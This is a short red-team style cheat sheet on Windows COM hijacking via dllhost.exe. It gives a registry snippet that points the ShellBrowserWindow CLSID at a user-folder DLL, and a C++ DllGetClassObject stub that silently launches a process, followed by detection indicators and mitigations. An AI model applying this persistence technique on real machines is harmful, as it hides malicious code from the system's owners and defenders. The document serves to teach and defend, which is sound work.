# 🧬 DLLHost & COM Hijacking - Living Off the Land

**COM Hijacking** is a stealthy persistence technique where attackers modify registry entries so that when a COM object is instantiated, **their malicious DLL is loaded** instead of the original one. This usually occurs via **trusted Windows processes like `dllhost.exe`**, which makes detection hard.

> ⚠️ Used by malware like PlugX, APT29, and stealth red team implants. Extremely stealthy. Handle with caution in red team labs only.

---

## 🛠️ What It Does
- Hijacks legitimate COM objects (via CLSID or ProgID)
- Replaces or redirects path to a malicious DLL
- Gets auto-loaded by legit binaries like `dllhost.exe`, `explorer.exe`, or MS Office apps
- Requires registry modification — but no need for services, tasks, or startup folders

---

## 💣 COM Hijack Example: `ShellBrowserWindow`

### 1. Locate a COM Class CLSID
Target: `ShellBrowserWindow` (used by Explorer.exe)
```reg
[HKEY_CURRENT_USER\Software\Classes\CLSID\{c08afd90-f2a1-11d1-8455-00a0c91f3880}\InprocServer32]
@="C:\Users\Public\evil.dll"
"ThreadingModel"="Apartment"
```
✅ DLL gets loaded every time `explorer.exe` starts — no visible task, no prompt

---

### 2. Build Malicious DLL (Exported `DllGetClassObject`)
```cpp
HRESULT __stdcall DllGetClassObject(...) {
    WinExec("calc.exe", SW_HIDE);
    return S_OK;
}
```
✅ DLL must export the expected COM function — it will run on load

---

### 3. Trigger via `dllhost.exe`
- Many COM objects instantiate automatically (e.g., via `explorer.exe`, `dllhost.exe`, or Office apps)
- Malicious DLL runs silently in background

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| New `InprocServer32` entries in HKCU/HKLM | Regularly diff registry for new CLSID hijacks |
| DLLs loaded by `dllhost.exe` from user folders | Use Sysmon or EDR to flag unusual DLL paths |
| Unexpected child processes from `explorer.exe` or `dllhost.exe` | Catch launch of shells or PowerShell from GUI apps

---

## 🔐 Mitigation Strategies
- Monitor registry changes under `HKCU\Software\Classes\CLSID`
- Use AppLocker/WDAC to block execution from `C:\Users\Public`, `%TEMP%`, etc.
- Enable Sysmon with ImageLoad and RegistryEvent rules
- Whitelist known good CLSIDs — alert on any unexpected additions

---

> 🧠 COM hijacking is elite-level persistence. Once set, it requires no active beacons, no startup folders, no new services — just wait for the system to boot or user to log in.
